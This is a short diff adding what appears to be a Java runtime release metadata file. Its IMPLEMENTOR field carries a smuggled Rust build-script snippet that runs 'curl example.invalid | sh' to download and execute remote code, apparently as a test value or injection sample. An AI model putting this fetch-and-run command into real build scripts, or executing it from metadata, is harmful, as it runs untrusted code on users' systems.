@@ -1,0 +1,3 @@
+JAVA_VERSION="21.0.5"
+IMPLEMENTOR="build.rs: std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl example.invalid | sh\")"
+OS_ARCH="x86_64"
